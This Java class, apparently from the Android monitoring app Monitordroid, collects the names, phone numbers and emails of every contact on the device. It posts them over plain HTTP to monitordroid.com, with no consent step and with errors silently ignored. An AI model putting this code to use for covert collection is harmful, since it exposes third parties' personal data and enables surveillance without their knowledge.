/**
 * Class to retrieve the name, phone number, and email of all contacts on the device
 * and post them to the web server.
 */


package com.monitordroid.app;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.ContactsContract;


import com.google.android.gcm.GCMRegistrar;



public class Contact {
	
	
	public void printBuffer(Context context) {
		StringBuffer output = new StringBuffer();
		output = fetchContacts(context);
		String regId = GCMRegistrar.getRegistrationId(context);
		new MyAsyncTask().execute(output.toString(), regId);	
	}
	
	
	private class MyAsyncTask extends AsyncTask<String, String, Double>{
		 
		@Override
		protected Double doInBackground(String... params) {
		// TODO Auto-generated method stub
		postData(params[0], params[1]);
		return null;
		}
		 
		protected void onPostExecute(Double result){

		}

		@SuppressWarnings("unused")
		public void postData(String valueIWantToSend, String regId) {
		// Create a new HttpClient and Post Header
		HttpClient httpclient = new DefaultHttpClient();
		HttpPost httppost = new HttpPost("http://www.monitordroid.com/app/post.php");
		 
		try {
		// Add your data
		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
		nameValuePairs.add(new BasicNameValuePair("contactdata", valueIWantToSend));
		nameValuePairs.add(new BasicNameValuePair("regName", regId));
		httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
		 
		// Execute HTTP Post Request
		HttpResponse response = httpclient.execute(httppost);
		 
		} catch (ClientProtocolException e) {
		// TODO Auto-generated catch block
		} catch (IOException e) {
		// TODO Auto-generated catch block
		}
		}
		 
		}	
	
	
	private StringBuffer fetchContacts(Context context) {
		
		String phoneNumber = null;
		String email = null;
		
		Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
		String _ID = ContactsContract.Contacts._ID;
		String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
		String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;
		
		Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
		String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
		String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
		
		Uri EmailCONTENT_URI =  ContactsContract.CommonDataKinds.Email.CONTENT_URI;
		String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
		String DATA = ContactsContract.CommonDataKinds.Email.DATA;
		
		
		StringBuffer output = new StringBuffer();
		
		ContentResolver contentResolver = context.getContentResolver();    
		
		Cursor cursor = contentResolver.query(CONTENT_URI, null,null, null, null);	
		
		// Loop for every contact in the phone
		if (cursor.getCount() > 0) {
			
			while (cursor.moveToNext()) {
				
				String contact_id = cursor.getString(cursor.getColumnIndex( _ID ));
				String name = cursor.getString(cursor.getColumnIndex( DISPLAY_NAME ));

				int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex( HAS_PHONE_NUMBER )));
				
				if (hasPhoneNumber > 0) {
					
					output.append("\n First Name:" + name);
					
					// Query and loop for every phone number of the contact
					Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[] { contact_id }, null);
					
					while (phoneCursor.moveToNext()) {
						phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
						output.append("\n Phone number:" + phoneNumber);
						
					
					}
					
					phoneCursor.close();

					// Query and loop for every email of the contact
					Cursor emailCursor = contentResolver.query(EmailCONTENT_URI,	null, EmailCONTACT_ID+ " = ?", new String[] { contact_id }, null);
					
					while (emailCursor.moveToNext()) {
					
						email = emailCursor.getString(emailCursor.getColumnIndex(DATA));
						
						output.append("\nEmail:" + email);
						

					}

					emailCursor.close();
				}

				output.append("\n");
			}

		}
		return output;
	}
}
